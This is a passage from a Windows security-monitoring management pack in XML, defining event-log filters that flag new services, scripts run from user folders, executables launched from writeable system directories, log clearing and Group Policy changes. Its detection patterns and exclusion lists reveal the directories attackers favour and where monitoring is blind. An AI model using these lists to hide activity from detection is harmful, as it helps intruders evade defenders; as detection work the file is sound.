                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">7045</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>MMAExtensionHeartbeatService.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>ProgramData\Microsoft\Windows Defender\Definition Updates</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>ProgramData\Microsoft\Microsoft Antimalware\Definition</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/App1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/App2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/App3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/App4$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/App5$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>WindowsAzureNetAgent.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.SuspiciousUserContext.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="OverrideableExe1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe5" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe6" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="OverrideableExe1" Selector="$Config/OverrideableExe1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe2" Selector="$Config/OverrideableExe2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe3" Selector="$Config/OverrideableExe3$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe4" Selector="$Config/OverrideableExe4$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe5" Selector="$Config/OverrideableExe5$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe6" Selector="$Config/OverrideableExe6$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4688</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe4$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe5$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe6$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>notepad.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>vbc.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <Or>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.ps1</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.cmd</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.bat</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.psm1</Pattern>
                          </RegExExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>:\Users\</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.Modules.SystemLogClear.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="AutoAccount" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="AutoAccount" Selector="$Config/AutoAccount$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName />
                <LogName>System</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">104</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">PublisherName</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">Microsoft-Windows-Eventlog</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[1]</XPathQuery>
                        </ValueExpression>
                        <Operator>NotEqual</Operator>
                        <ValueExpression>
                          <Value Type="String">$Config/AutoAccount$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.WriteableDirectories.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="OverrideableExe1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="OverrideableExe1" Selector="$Config/OverrideableExe1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe2" Selector="$Config/OverrideableExe2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe3" Selector="$Config/OverrideableExe3$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath1" Selector="$Config/OverrideableFilePath1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath2" Selector="$Config/OverrideableFilePath2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath3" Selector="$Config/OverrideableFilePath3$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4688</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>DismHost.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>MpSigStub.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>WindowsUpdateLog\tracerpt.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <Or>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.exe</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.ps1</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>.psm1</Pattern>
                          </RegExExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <Or>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>Windows\debug\WIA</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\PCHEALTH\ERRORREP\QHEADLES</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\Registration\CRMLog</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>Windows\System32\Com\dmp</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\spool\drivers\color</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\spool\PRINTERS</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\spool\SERVERS</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\Tasks</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\Tasks\Microsoft\Windows\PLA\System</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\System32\Tasks\Microsoft\Windows\RemoteApp and Desktop Connections Update</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\SysWOW64\Com\dmp</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\SysWOW64\Tasks</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\SysWOW64\Tasks\Microsoft\Windows\RemoteApp and Desktop Connections Update</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\Tasks</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\Temp</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>ContainsSubstring</Operator>
                            <Pattern>\Windows\tracing</Pattern>
                          </RegExExpression>
                        </Expression>
                      </Or>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.WriteableDirectoriesExtended.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="OverrideableExe1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableExe3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="OverrideableFilePath3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="OverrideableExe1" Selector="$Config/OverrideableExe1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe2" Selector="$Config/OverrideableExe2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableExe3" Selector="$Config/OverrideableExe3$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath1" Selector="$Config/OverrideableFilePath1$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath2" Selector="$Config/OverrideableFilePath2$" ParameterType="string" />
          <OverrideableParameter ID="OverrideableFilePath3" Selector="$Config/OverrideableFilePath3$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4688</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>DismHost.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>MpSigStub.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>WindowsUpdateLog\tracerpt.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableExe3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/OverrideableFilePath3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>.exe</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>$Target/Property[Type='Security.Monitoring.WriteableLocations']/FolderPath$</Pattern>
                      </RegExExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.GPOMonitoring.Event.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="AGPMAccount" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="AGPMDomain" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="AGPMAccount" Selector="$Config/AGPMAccount$" ParameterType="string" />
          <OverrideableParameter ID="AGPMDomain" Selector="$Config/AGPMDomain$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName />
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <Or>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">groupPolicyContainer</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">domainDNS</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">5136</Value>
                        </ValueExpression>
